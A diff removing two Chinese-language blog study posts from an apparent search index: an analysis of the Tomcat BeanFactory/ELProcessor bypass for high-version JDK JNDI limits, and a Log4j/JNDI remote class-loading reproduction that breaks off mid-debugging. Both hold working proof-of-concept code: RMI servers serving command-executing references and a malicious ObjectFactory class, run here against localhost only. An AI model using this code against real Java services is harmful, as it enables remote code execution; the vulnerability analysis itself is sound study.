@@ -760,596 +760,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JNDI高版本绕过</title>
-    <url>/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>高版本JDK在RMI和LDAP的<code>trustURLCodebase</code>都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制</p>
-<h2 id="需要绕过的原因分析"><a href="#需要绕过的原因分析" class="headerlink" title="需要绕过的原因分析"></a>需要绕过的原因分析</h2><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171223492.png"
-                      class="" title="image-20250314171223492"
-                > 
-
-<p>前面学习的时候我们发现需要将trustURLCodebase设置为true才可以进行漏洞利用，原因前面的文章有写</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314171552126.png"
-                      class="" title="image-20250314171552126"
-                > 
-
-<p>但是我们现实环境中我们又不可能插入代码设置trustURLCodebase为true，所以就只能从前面两个判断中进行绕过<br>但是var8又是我们指定的类，所以没办法为null，能操作的地方就在*var8.getFactoryClassLocation()*这个地方了</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; //这个是我们利用的javax.el.ELProcessor这个类在里面</span><br><span class="line">      &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;tomcat-jasper&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;8.5.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>tomcat的版本是有要求的，因为我们利用了他的forceString属性</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183149852.png"
-                      class="" title="image-20250314183149852"
-                > 
-
-<p>所以我们需要低于这些版本</p>
-<h3 id="rmi服务端"><a href="#rmi服务端" class="headerlink" title="rmi服务端"></a>rmi服务端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import javax.naming.StringRefAddr;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class BeanFactoryRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;,</span><br><span class="line">                true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;a=eval&quot;));</span><br><span class="line"></span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;));</span><br><span class="line">//        resourceRef.add(new StringRefAddr(&quot;a&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;));</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);</span><br><span class="line">        registry.bind(&quot;el&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>windows下那个exec里面的命令好像需要改一下，根据自身条件判断，我的是macos，windows改成calc即可</p>
-<h3 id="尝试连接的客户端"><a href="#尝试连接的客户端" class="headerlink" title="尝试连接的客户端"></a>尝试连接的客户端</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line">import org.mvel2.sh.ShellSession;</span><br><span class="line"></span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Object lookup = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/el&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="绕过用的类分析"><a href="#绕过用的类分析" class="headerlink" title="绕过用的类分析"></a>绕过用的类分析</h2><p>我们使用了ResourceRef对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173241334.png"
-                      class="" title="image-20250314173241334"
-                > 
-
-<p>参考浅蓝师傅的文章</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314172459283.png"
-                      class="" title="image-20250314172459283"
-                > 
-<p>参考这个师傅的文章的图<a class="link"   href="https://www.cnblogs.com/EddieMurphy-blogs/p/18078943" >https://www.cnblogs.com/EddieMurphy-blogs/p/18078943<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
-<h3 id="ResourceRef"><a href="#ResourceRef" class="headerlink" title="ResourceRef"></a>ResourceRef</h3><p><strong>初步分析，这里看不懂很正常，我就举一下这里用到的两个类的关键的地方</strong></p>
-<p>看着我的步骤把后续的JNDI完整的链子跟完就知道这些关键点的用处了</p>
-<p>这个类的构造有三个关键的地方</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185156624.png"
-                      class="" title="image-20250314185156624"
-                > 
-
-<h4 id="factoryLocation为null"><a href="#factoryLocation为null" class="headerlink" title="factoryLocation为null"></a>factoryLocation为null</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185354274.png"
-                      class="" title="image-20250314185354274"
-                > 
-
-<p>获取了我们构造的ResourceRef对象，然后获取它的<strong>factoryLocation</strong> ，如果为null，那就绕过，执行else里面的return 后面的方法</p>
-<h4 id="factory为BeanFactory"><a href="#factory为BeanFactory" class="headerlink" title="factory为BeanFactory"></a>factory为BeanFactory</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185709179.png"
-                      class="" title="image-20250314185709179"
-                > 
-
-<p>从我们构造的ResourceRef中获取factoryClass，提取出了BeanFactory</p>
-<h4 id="resourceClass为漏洞利用的类"><a href="#resourceClass为漏洞利用的类" class="headerlink" title="resourceClass为漏洞利用的类"></a>resourceClass为漏洞利用的类</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185820880.png"
-                      class="" title="image-20250314185820880"
-                > 
-
-<p>factory为org.apache.naming.factory.BeanFactory，所以调用它的getObjectInstance方法</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314185922046.png"
-                      class="" title="image-20250314185922046"
-                > 
-
-<p>这里他获取了ref就是我们的ResourceRef对象的class的name，就是我们resourceClass设置的<strong>javax.el.ELProcessor</strong> ，然后后续就是将这个<strong>javax.el.ELProcessor</strong> 给实例化然后利用反射去调用eval方法实现命令执行。</p>
-<h3 id="org-apache-naming-factory-BeanFactory"><a href="#org-apache-naming-factory-BeanFactory" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><p>这个类我们先不看太多，流程跟着后面完整分析走就可以懂，就看一个关键的点。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190224659.png"
-                      class="" title="image-20250314190224659"
-                > 
-
-<p>获取了我们所需要用到的<strong>javax.el.ELProcessor</strong> 的类名</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190250894.png"
-                      class="" title="image-20250314190250894"
-                > 
-
-<p>把我们的类给实例化了存在bean参数里面</p>
-<p><strong>中间有一段获取方法以及参数的过程</strong> 流程后面有写</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190342664.png"
-                      class="" title="image-20250314190342664"
-                > 
-
-<p>反射调用命令执行。</p>
-<h2 id="JNDI绕过完整分析"><a href="#JNDI绕过完整分析" class="headerlink" title="JNDI绕过完整分析"></a>JNDI绕过完整分析</h2><p>看一下payload对应的参数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173431977.png"
-                      class="" title="image-20250314173431977"
-                > 
-
-<p>可以观察到factoryLocation这个参数被设置为了null，就是为了绕过我们的JNDI的那个if判断</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173927228.png"
-                      class="" title="image-20250314173927228"
-                > 
-<p>然后还有forceString进行构造，我们可以打上断点进行跟踪</p>
-<h3 id="漏洞触发点分析"><a href="#漏洞触发点分析" class="headerlink" title="漏洞触发点分析"></a>漏洞触发点分析</h3><p>接下来分析的是，lookup()链子走的时候是怎么绕过前面说的trustURLCodebase的限制，以及怎么触发的实例化getObjectInstance方法。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183733704.png"
-                      class="" title="image-20250314183733704"
-                > 
-
-<p>进入deocdeObject</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183818414.png"
-                      class="" title="image-20250314183818414"
-                > 
-
-<p>提前看一下被限制的地方我们打上断点</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183851246.png"
-                      class="" title="image-20250314183851246"
-                > 
-
-<p>然后我们一步一步走</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183930238.png"
-                      class="" title="image-20250314183930238"
-                > 
-
-<p>var3是ResourceRef对象，且后续将它赋值给了var8</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184007058.png"
-                      class="" title="image-20250314184007058"
-                > 
-
-<p>然后进入判断的地方</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184020438.png"
-                      class="" title="image-20250314184020438"
-                > 
-
-<p>这里我们前面的payload设置为null的，所以可以绕过</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184052474.png"
-                      class="" title="image-20250314184052474"
-                > 
-
-<p>走到了我们实例化的地方，var3此时还是ResourceRef对象</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184424645.png"
-                      class="" title="image-20250314184424645"
-                > 
-
-<p>这里获取factoryClassName，然后进行操作</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184537599.png"
-                      class="" title="image-20250314184537599"
-                > 
-
-<p>漏洞触发点，这里构造成了<strong>org.apache.naming.factory.BeanFactory.getObjectInstance</strong> 就是我们上面写的地方</p>
-<h3 id="org-apache-naming-factory-BeanFactory-1"><a href="#org-apache-naming-factory-BeanFactory-1" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180259634.png"
-                      class="" title="image-20250314180259634"
-                > 
-
-<p>这里获取了我们要利用的类的类名</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180337115.png"
-                      class="" title="image-20250314180337115"
-                > 
-
-<p>然后将他加载</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180520260.png"
-                      class="" title="image-20250314180520260"
-                > 
-
-<p>将它实例化存储在bean里面</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314191103326.png"
-                      class="" title="image-20250314191103326"
-                > 
-
-<p>从forceString里面提取字符串a&#x3D;eval，然后提取为了param&#x3D;a，setterName&#x3D;eval</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180633736.png"
-                      class="" title="image-20250314180633736"
-                > 
-
-<p>跟进他这里的getMethod，因为此时我们的类在变量beanClass里，eval也是提取出来在setterName，没有拼接或者组合成<strong>javax.el.ELProcessor.eval()</strong> ,这里就是获取方法的地方，就像我们之前的<strong>类.getMethod(方法名,参数类型)</strong>  </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181503362.png"
-                      class="" title="image-20250314181503362"
-                > 
-
-<p>进行一个循环，要求右边那一列不为scope、auth、singletoken、forceString</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181638180.png"
-                      class="" title="image-20250314181638180"
-                > 
-
-<p>value就是获取的参数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181734119.png"
-                      class="" title="image-20250314181734119"
-                > 
-
-<p>获取参数成功。</p>
-<p>这里就很眼熟了，method为方法，bean为对象，valueArray就是参数，利用反射去造成命令执行。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314175123674.png"
-                      class="" title="image-20250314175123674"
-                > 
-
-<p>计算器弹出成功。最后达成了类似<strong>eval.invoke(javax.el.ELProcessor,Runtime.getRuntime().exec(“open -a Calculator”))</strong></p>
-]]></content>
-      <categories>
-        <category>漏洞原理分析</category>
-      </categories>
-      <tags>
-        <tag>JNDI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Log4j漏洞分析</title>
-    <url>/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
-<li>rmi服务端</li>
-<li>rmi客户端</li>
-<li>恶意类的实现</li>
-<li>idea+jdk1.8.0_441</li>
-</ul>
-<h2 id="pom-xml导入依赖"><a href="#pom-xml导入依赖" class="headerlink" title="pom.xml导入依赖"></a>pom.xml导入依赖</h2><p>正常可以使用maven</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></div>
-<p>但是我使用的阿里云的maven配置，所以一直远程拉取不了，这里介绍本地配置依赖的方法<br>访问<a class="link"   href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0" >https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.9.0<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110830202.png"
-                      class="" title="image-20250311110830202"
-                >
-
-<p>创建一个lib目录将依赖放进去</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311110902143.png"
-                      class="" title="image-20250311110902143"
-                > 
-
-<p>然后pom.xml里面配置</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">            &lt;systemPath&gt;$&#123;project.basedir&#125;/lib/log4j-core-2.9.0.jar&lt;/systemPath&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="服务端代码实现"><a href="#服务端代码实现" class="headerlink" title="服务端代码实现"></a>服务端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line"></span><br><span class="line">public class log4j_server &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(12345);</span><br><span class="line">        //创建一个注册表且端口为12345</span><br><span class="line">        Reference reference = new Reference(&quot;Evil&quot;, &quot;Evil&quot;,</span><br><span class="line">                &quot;http://127.0.0.1:8080/&quot;);</span><br><span class="line">        //创建Reference对象，类名为Evil，工厂类名为Evil</span><br><span class="line">        ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">        //使用ReferenceWrapper包装Reference对象</span><br><span class="line">        registry.bind(&quot;remote&quot;, wrapper);</span><br><span class="line">        //将包装好的对象绑定到注册表中并设置名称为remote</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111035431.png"
-                      class="" title="image-20250311111035431"
-                >
-
-<h2 id="客户端代码实现"><a href="#客户端代码实现" class="headerlink" title="客户端代码实现"></a>客户端代码实现</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mport javax.naming.InitialContext;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">public class Log4j_client &#123;</span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        //System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">        // 这里先注释掉，这里是高版本jdk的防范机制，对url默认不信任，然后无法复现成功</span><br><span class="line">        InitialContext initialContext=new InitialContext();</span><br><span class="line">        // 创建一个JNDI InitialContext实例，用于访问JNDI服务</span><br><span class="line">        initialContext.lookup(&quot;rmi://127.0.0.1:12345/remote&quot;);</span><br><span class="line">        // 尝试连接远程主机</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111158954.png"
-                      class="" title="image-20250311111158954"
-                > 
-
-<h2 id="恶意类Evil"><a href="#恶意类Evil" class="headerlink" title="恶意类Evil"></a>恶意类Evil</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Evil implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111254962.png"
-                      class="" title="image-20250311111254962"
-                > 
-
-<h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>启动服务端和客户端</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111345871.png"
-                      class="" title="image-20250311111345871"
-                > 
-
-<p><em>报错The object factory is untrusted. Set the system property ‘com.sun.jndi.rmi.object.trustURLCodebase’ to ‘true’</em> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111457239.png"
-                      class="" title="image-20250311111457239"
-                > 
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250314171332324.png"
-                      class="" title="image-20250314171332324"
-                > 
-
-<p>我们需要进入getObjectInstance，所以我们需要进入else，就是if的条件一个都不能满足，低版本的jdk里面没有这个限制可以不用设置。高版本有这个设置。所以测试的时候不采用绕过手段我们就需要全局设置trustURLCodebase参数设置为true<strong>这里我们初步学习不采用绕过方式，所以需要设置trustURLCodebase为true</strong> </p>
-<p>所以可以先在代码层面配置一下</p>
-<p>把客户端注释删掉</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111521783.png"
-                      class="" title="image-20250311111521783"
-                > 
-
-<p> 再次运行</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311111556400.png"
-                      class="" title="image-20250311111556400"
-                >
-
-<p>实现命令执行</p>
-<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p>端点打在客户端的<strong>initialContext.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:12345&#x2F;remote”);</strong> </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112142514.png"
-                      class="" title="image-20250311112142514"
-                > 
-
-<p>跟进initialContext.lookup</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112322450.png"
-                      class="" title="image-20250311112322450"
-                >
-
-<p>这里通过提取协议，提取出来了rmi，然后判断协议是否为空，如果不为空说明是我们的url是一个ip地址  </p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311112621799.png"
-                      class="" title="image-20250311112621799"
-                >
-
-<p>回到上面的lookup跟进</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113252823.png"
-                      class="" title="image-20250311113252823"
-                >
-
-<p>ResolveResult var2 &#x3D; this.getRootURLContext(var1, this.myEnv);</p>
-<p>这个函数将我们的url给提取成了ip，port，以及注册表的绑定的名字remote</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113439043.png"
-                      class="" title="image-20250311113439043"
-                >
-
-<p>var3也是，知识获取了对象并且设置对象的类型为context</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113517988.png"
-                      class="" title="image-20250311113517988"
-                >
-
-<p>跟进这里的lookup，漏洞触发的地方</p>
-<p>先看var2.getRemainingName() 会返回的是什么参数</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113727742.png"
-                      class="" title="image-20250311113727742"
-                >
-
-<p>就只是返回remote，我们注册表的名字</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20250311113816366.png"
-                      class="" title="image-20250311113816366"
-                >
-
-<p>判断我们传入的注册表的名字是否为空，我们的是remote不为空，所以往下走</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
